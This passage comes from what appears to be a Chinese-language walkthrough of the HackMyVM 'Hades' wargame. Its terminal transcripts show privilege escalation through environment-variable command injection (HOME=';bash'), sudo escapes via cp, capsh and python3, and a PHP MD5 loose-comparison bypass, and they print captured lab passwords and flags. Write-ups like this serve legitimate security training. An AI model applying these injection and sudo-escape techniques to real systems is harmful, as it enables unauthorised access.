<span class="token assign-left variable">SSH_TTY</span><span class="token operator">=</span>/dev/pts/16
<span class="token assign-left variable">_</span><span class="token operator">=</span>/usr/bin/env</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:~$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span><span class="token number">123</span>
aphrodite@hades:/pwned/aphrodite$ ./homecontent 
The content of your <span class="token environment constant">HOME</span> is:
/bin/ls: cannot access <span class="token string">'123'</span><span class="token builtin class-name">:</span> No such <span class="token function">file</span> or directory</code></pre>
<p>事实如此</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:/pwned/aphrodite$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span><span class="token punctuation">;</span><span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span>
aphrodite@hades:/pwned/aphrodite$ ./homecontent 
The content of your <span class="token environment constant">HOME</span> is:
ariadne_pass.txt  flagz.txt  homecontent  mission.txt</code></pre>
<p>有点问题</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:/pwned/aphrodite$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span><span class="token string">';id'</span>
aphrodite@hades:/pwned/aphrodite$ ./homecontent 
The content of your <span class="token environment constant">HOME</span> is:
ariadne_pass.txt  flagz.txt  homecontent  mission.txt
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2049</span><span class="token punctuation">(</span>ariadne<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span></code></pre>
<p>加上单引号结果正确</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:/pwned/aphrodite$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span><span class="token string">';bash'</span>
aphrodite@hades:/pwned/aphrodite$ ./homecontent 
The content of your <span class="token environment constant">HOME</span> is:
ariadne_pass.txt  flagz.txt  homecontent  mission.txt
ariadne@hades:/pwned/aphrodite$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2049</span><span class="token punctuation">(</span>ariadne<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span>
ariadne@hades:/pwned/aphrodite$ <span class="token function">ls</span>
ariadne_pass.txt  flagz.txt  homecontent  mission.txt
ariadne@hades:/pwned/aphrodite$ <span class="token function">cat</span> ariadne_pass.txt 
iNgNazuJrmhJKWixktzk</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">ariadne@hades:~$ <span class="token function">cat</span> flagz.txt 
^FuGFaFNhtKNxUInxAtd^</code></pre>
<h2 id="MISSION-0x08"><a href="#MISSION-0x08" class="headerlink" title="MISSION 0x08"></a>MISSION 0x08</h2><pre class="language-bash" data-language="bash"><code class="language-bash">ariadne@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x08 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user arete lets us use <span class="token function">cp</span> on her behalf. 

<span class="token comment">## ES ##</span>
La usuaria arete nos deja usar <span class="token function">cp</span> en <span class="token function">su</span> nombre.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">ariadne@hades:~$ <span class="token function">cp</span> /run/lock/arete_pass.txt <span class="token builtin class-name">.</span>
cp: cannot <span class="token function">open</span> <span class="token string">'/run/lock/arete_pass.txt'</span> <span class="token keyword">for</span> reading: Permission denied
ariadne@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> ariadne on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User ariadne may run the following commands on hades:
    <span class="token punctuation">(</span>arete<span class="token punctuation">)</span> NOPASSWD: /bin/cp</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">ariadne@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> arete* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/run/lock/arete_pass.txt
/var/tmp/arete_pass.txt
/var/tmp/333/arete
/var/tmp/arete
/pwned/arete
ariadne@hades:~$ <span class="token function">touch</span> /var/tmp/taotao
ariadne@hades:~$ <span class="token function">chmod</span>  <span class="token number">777</span> /var/tmp/taotao
ariadne@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> arete /bin/cp /run/lock/arete_pass.txt /var/tmp/taotao
ariadne@hades:~$ <span class="token function">cat</span> /var/tmp/taotao
QjrIovHacmGWxVjXRLmA</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">arete@hades:~$ <span class="token function">ls</span>
flagz.txt  mission.txt
arete@hades:~$ <span class="token function">cat</span> flagz.txt 
^qmrrbGUXLTqLFDyCDlx^</code></pre>
<h2 id="MISSION-0x09"><a href="#MISSION-0x09" class="headerlink" title="MISSION 0x09"></a>MISSION 0x09</h2><pre class="language-bash" data-language="bash"><code class="language-bash">arete@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x09 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user artemis allows us to use some binary on her behalf. Its a gift<span class="token punctuation">..</span>. 

<span class="token comment">## ES ##</span>
La usuaria artemis nos permite usar algun binario en <span class="token function">su</span> nombre. Es un regalo<span class="token punctuation">..</span>.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">arete@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x09 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user artemis allows us to use some binary on her behalf. Its a gift<span class="token punctuation">..</span>. 

<span class="token comment">## ES ##</span>
La usuaria artemis nos permite usar algun binario en <span class="token function">su</span> nombre. Es un regalo<span class="token punctuation">..</span>.
arete@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> arete on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User arete may run the following commands on hades:
    <span class="token punctuation">(</span>artemis<span class="token punctuation">)</span> NOPASSWD: /sbin/capsh</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">arete@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> artemis /sbin/capsh --
artemis@hades:/pwned/arete$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2051</span><span class="token punctuation">(</span>artemis<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2051</span><span class="token punctuation">(</span>artemis<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2051</span><span class="token punctuation">(</span>artemis<span class="token punctuation">)</span>
artemis@hades:/pwned/arete$ <span class="token builtin class-name">cd</span> ~
artemis@hades:~$ <span class="token function">ls</span>
flagz.txt  mission.txt  restricted
artemis@hades:~$ <span class="token function">cat</span> flagz.txt 
^SegGdzPgnNdGAmKjnsa^
artemis@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> artem* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/usr/share/artemis_pass.txt
/pwned/artemis
artemis@hades:~$ <span class="token function">cat</span> /usr/share/artemis_pass.txt
HIiaojeORLaJBVSPDDCZ</code></pre>
<h2 id="MISSION-0x10"><a href="#MISSION-0x10" class="headerlink" title="MISSION 0x10"></a>MISSION 0x10</h2><pre class="language-bash" data-language="bash"><code class="language-bash">artemis@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x10 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
We need /bin/bash so that the user asia gives us her password. 

<span class="token comment">## ES ##</span>
Necesitamos /bin/bash para que la usuaria asia nos de <span class="token function">su</span> password.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">artemis@hades:~$ ./restricted 
Your <span class="token environment constant">SHELL</span> is: /bin/rbash

djqWtkLisbQlrGtLYHCv</code></pre>
<p>???点就送?</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">asia@hades:~$ <span class="token function">cat</span> flagz.txt 
^ngXdULWFWKCGtgxAQNv^</code></pre>
<h2 id="MISSION-0x11"><a href="#MISSION-0x11" class="headerlink" title="MISSION 0x11"></a>MISSION 0x11</h2><pre class="language-bash" data-language="bash"><code class="language-bash">asia@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x11 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user asteria is teaching us to program <span class="token keyword">in</span> python. 

<span class="token comment">## ES ##</span>
La usuaria asteria nos esta enseñando a programar en python.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">asia@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> asia on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User asia may run the following commands on hades:
    <span class="token punctuation">(</span>asteria<span class="token punctuation">)</span> NOPASSWD: /usr/bin/python3</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">asia@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> asteria /usr/bin/python3 <span class="token parameter variable">-c</span> <span class="token string">'import os; os.system("/bin/sh")'</span>
$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2003</span><span class="token punctuation">(</span>asteria<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2003</span><span class="token punctuation">(</span>asteria<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2003</span><span class="token punctuation">(</span>asteria<span class="token punctuation">)</span>
$ ^<span class="token punctuation">[</span><span class="token punctuation">[</span>A^<span class="token punctuation">[</span><span class="token punctuation">[</span>A^C
$ <span class="token function">bash</span>
asteria@hades:/pwned/asia$ <span class="token builtin class-name">cd</span> ~
asteria@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">36</span>
drwxr-x--- <span class="token number">2</span> root    asteria <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root    root    <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> asteria asteria  <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> asteria asteria <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> asteria asteria  <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r----- <span class="token number">1</span> root    asteria   <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root    asteria  <span class="token number">145</span> Apr  <span class="token number">5</span> 06:36 mission.txt
-rw-r----- <span class="token number">1</span> root    asteria  <span class="token number">161</span> Apr  <span class="token number">5</span> 06:36 sihiri_old.php
asteria@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> asteria* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/usr/share/doc/asteria_pass.txt
/pwned/asteria
asteria@hades:~$ <span class="token function">cat</span> /usr/share/doc/asteria_pass.txt
hawMVJCYrBgoDAMVhuwT
asteria@hades:~$ <span class="token function">cat</span> flagz.txt 
^xSRhIftMsAwWvBAnqNZ^</code></pre>
<h2 id="MISSION-0x11-1"><a href="#MISSION-0x11-1" class="headerlink" title="MISSION 0x11"></a>MISSION 0x11</h2><pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x12 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user astraea believes <span class="token keyword">in</span> magic. 

<span class="token comment">## ES ##</span>
La usuaria astraea cree en la magia.
asteria@hades:~$ </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:~$ <span class="token function">cat</span> sihiri_old.php 

<span class="token operator">&lt;</span>?php
<span class="token variable">$pass</span> <span class="token operator">=</span> hash<span class="token punctuation">(</span><span class="token string">'md5'</span>, <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$pass2</span> <span class="token operator">=</span> hash<span class="token punctuation">(</span><span class="token string">'md5'</span>,<span class="token string">"ASTRAEA_PASS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
if<span class="token punctuation">(</span><span class="token variable">$pass</span> <span class="token operator">==</span> <span class="token variable">$pass2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
print<span class="token punctuation">(</span><span class="token string">"ASTRAEA_PASS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
else<span class="token punctuation">&#123;</span>
print<span class="token punctuation">(</span><span class="token string">"Incorrect ^^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
?<span class="token operator">></span></code></pre>
<p>md5弱比较</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:~$ <span class="token builtin class-name">cd</span> /var/www/html
asteria@hades:/var/www/html$ <span class="token function">ls</span>
id.zip  irene_auth.php  req.php  request.php  sihiri.php
asteria@hades:/var/www/html$ <span class="token function">curl</span> <span class="token number">127.0</span>.0.1/sihiri.php?pass<span class="token operator">=</span>s155964671a
nZkEYtjvHElOtupXKzTE</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:~$ <span class="token function">ssh</span> astraea@127.0.0.1
The authenticity of <span class="token function">host</span> <span class="token string">'127.0.0.1 (127.0.0.1)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:5QshhvvnibVTWOxgK9XbUejVSLahU6clfnK1Iku0wsg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '</span>/pwned/asteria/.ssh<span class="token string">' (Permission denied).
Failed to add the host to the list of known hosts (/pwned/asteria/.ssh/known_hosts).

                                                      .     **                                   
                                                   *           *.                                 
                                                                  ,*                              
                                                                     *,                            
                                             ,                         ,*                         
                                          .,                              *,                       
                                       /                                    *                    
                                    ,*                                        *,                  
                                 /.                                            .*.                 
                                                                _____                     
                __     __           _____         ____________      _____\    \            _____   
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \  
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    | 
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/| 
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   || 
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/ 
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \      
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|     
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |     
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/      
                                                                        |___|/                     
        
                                       **                                    **.                    
                                          ,*                                **                       
                                             *,                          ,*                          
                                                *                      **                            
                                                *,                .*                              
                                                   *.           **                                 
                                                      **      ,*,                                 
                                                         ** *, 
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &amp;          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+

                                          
astraea@127.0.0.1'</span>s password: 
^KssHQIAFsxUamecyXIUk^
Connection to <span class="token number">127.0</span>.0.1 closed.</code></pre>
<h2 id="MISSION-0x12"><a href="#MISSION-0x12" class="headerlink" title="MISSION 0x12"></a>MISSION 0x12</h2><p>用密码登ssh连不上</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">astraea@hades.hackmyvm.eu's password: 
^KssHQIAFsxUamecyXIUk^
Connection to hades.hackmyvm.eu closed.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:/var/tmp$ ./busybox <span class="token function">netstat</span> <span class="token parameter variable">-tulnp</span>
netstat: can't scan /proc - are you root?
Active Internet connections <span class="token punctuation">(</span>only servers<span class="token punctuation">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.11:38595        <span class="token number">0.0</span>.0.0:*               LISTEN      -
tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.1:6667          <span class="token number">0.0</span>.0.0:*               LISTEN      -
tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:80              <span class="token number">0.0</span>.0.0:*               LISTEN      -
tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:22              <span class="token number">0.0</span>.0.0:*               LISTEN      -
tcp        <span class="token number">0</span>      <span class="token number">0</span> :::1965                 :::*                    LISTEN      -
tcp        <span class="token number">0</span>      <span class="token number">0</span> :::80                   :::*                    LISTEN      -
tcp        <span class="token number">0</span>      <span class="token number">0</span> :::21                   :::*                    LISTEN      -
tcp        <span class="token number">0</span>      <span class="token number">0</span> :::22                   :::*                    LISTEN      -
udp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.11:56483        <span class="token number">0.0</span>.0.0:*                           -
udp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:44595           <span class="token number">0.0</span>.0.0:*                           -
udp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:55168           <span class="token number">0.0</span>.0.0:*                           -</code></pre>
<p>回到上一个用户，直接把别人传的工具拿来用，执行发现21端口开启了<br>用ftp登录astraea</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:/var/tmp$ <span class="token function">ftp</span> astraea@127.0.0.1
Connected to <span class="token number">127.0</span>.0.1.
<span class="token number">220</span> <span class="token punctuation">(</span>vsFTPd <span class="token number">3.0</span>.3<span class="token punctuation">)</span>
<span class="token number">331</span> Please specify the password.
Password: 
<span class="token number">230</span> Login successful.
Remote system <span class="token builtin class-name">type</span> is UNIX.
Using binary mode to transfer files.
ftp<span class="token operator">></span> <span class="token function">ls</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">57382</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Here comes the directory listing.
-rw-r-----    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">2004</span>           <span class="token number">21</span> Apr 05 06:36 atalanta.txt
-rw-r-----    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">2004</span>           <span class="token number">22</span> Apr 05 06:36 flagz.txt
-rw-r-----    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">2004</span>          <span class="token number">181</span> Apr 05 06:36 mission.txt
<span class="token number">226</span> Directory send OK.
ftp<span class="token operator">></span> get flagz.txt
local: flagz.txt remote: flagz.txt
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">43360</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> flagz.txt <span class="token punctuation">(</span><span class="token number">22</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>***********************************************************************************************************************************************************************************************<span class="token operator">|</span>    <span class="token number">22</span>       <span class="token number">92.60</span> KiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">22</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">23.05</span> KiB/s<span class="token punctuation">)</span>
ftp<span class="token operator">></span> get mission.txt
local: mission.txt remote: mission.txt
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">42173</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> mission.txt <span class="token punctuation">(</span><span class="token number">181</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>***********************************************************************************************************************************************************************************************<span class="token operator">|</span>   <span class="token number">181</span>      <span class="token number">521.40</span> KiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">181</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">252.15</span> KiB/s<span class="token punctuation">)</span>
ftp<span class="token operator">></span> get atalanta.txt
local: atalanta.txt remote: atalanta.txt
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">34197</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> atalanta.txt <span class="token punctuation">(</span><span class="token number">21</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>***********************************************************************************************************************************************************************************************<span class="token operator">|</span>    <span class="token number">21</span>       <span class="token number">33.34</span> KiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">21</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">19.41</span> KiB/s<span class="token punctuation">)</span>
ftp<span class="token operator">></span> <span class="token builtin class-name">exit</span>
<span class="token number">221</span> Goodbye.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:/var/tmp$ <span class="token function">cat</span> atalanta.txt 
mUcSNQlaXtwSvGcgeTYZ
asteria@hades:/var/tmp$ <span class="token function">cat</span> flagz.txt 
^nqTHTzMzDPDJrKPCfVR^
asteria@hades:/var/tmp$ <span class="token function">cat</span> mission.txt
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x13 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user atalanta has <span class="token keyword">done</span> something with our account. 

<span class="token comment">## ES ##</span>
La usuaria atalanta ha hecho algo con nuestra cuenta.</code></pre>
<h2 id="MISSION-0x13"><a href="#MISSION-0x13" class="headerlink" title="MISSION 0x13"></a>MISSION 0x13</h2><pre class="language-bash" data-language="bash"><code class="language-bash">asteria@hades:/var/tmp$ <span class="token function">cat</span> mission.txt
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x13 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user atalanta has <span class="token keyword">done</span> something with our account. 

<span class="token comment">## ES ##</span>
La usuaria atalanta ha hecho algo con nuestra cuenta.</code></pre>
<p>用上题拿到的密码登录atalanta</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">atalanta@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">60</span>
drwxr-x--- <span class="token number">1</span> root     atalanta  <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root     root      <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> atalanta atalanta   <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> atalanta atalanta  <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> atalanta atalanta   <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r----- <span class="token number">1</span> root     atalanta    <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root     atalanta   <span class="token number">237</span> Apr  <span class="token number">5</span> 06:36 mission.txt
-r-sr-s--- <span class="token number">1</span> root     atalanta <span class="token number">16608</span> Apr  <span class="token number">5</span> 06:36 weird
<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> atalanta atalanta    <span class="token number">21</span> Jun <span class="token number">12</span> 09:05 weird.c
atalanta@hades:~$ <span class="token function">cat</span> flagz.txt 
^XXZbDJTQQWCHJWTGeOw^</code></pre>
<h2 id="MISSION-0x14"><a href="#MISSION-0x14" class="headerlink" title="MISSION 0x14"></a>MISSION 0x14</h2><pre class="language-bash" data-language="bash"><code class="language-bash">atalanta@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x14 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User athena lets us run her program, but she hasn't left us her <span class="token builtin class-name">source</span> code.

<span class="token comment">## ES ##</span>
La usuaria athena nos deja ejecutar <span class="token function">su</span> programa, pero no nos ha dejado <span class="token function">su</span> codigo fuente.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">atalanta@hades:~$ <span class="token function">cat</span> weird.c
kmQMpZsXgOsnzGReRcoV</code></pre>
<p>为什么直接给了密码?</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">athena@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">36</span>
drwxr-x--- <span class="token number">2</span> root   athena <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root   root   <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> athena athena  <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> athena athena <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> athena athena  <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r----- <span class="token number">1</span> root   athena  <span class="token number">166</span> Apr  <span class="token number">5</span> 06:36 auri_old.sh
-rw-r----- <span class="token number">1</span> root   athena   <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root   athena  <span class="token number">160</span> Apr  <span class="token number">5</span> 06:36 mission.txt
athena@hades:~$ <span class="token function">cat</span> flagz.txt 
^oGwmbNYdtHwJgznZdur^</code></pre>
<h2 id="Mission-0x15"><a href="#Mission-0x15" class="headerlink" title="Mission 0x15"></a>Mission 0x15</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">################</span>
<span class="token comment"># MISSION 0x15 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User aura lets us use her new script.

<span class="token comment">## ES ##</span>
La usuaria aura nos deja utilizar <span class="token function">su</span> nuevo script.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">athena@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> athena on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User athena may run the following commands on hades:
    <span class="token punctuation">(</span>aura<span class="token punctuation">)</span> NOPASSWD: /bin/bash <span class="token parameter variable">-c</span> /pwned/aura/auri.sh</code></pre>
<p>可以看到只有权限执行这个脚本的，看一下这个脚本</p>
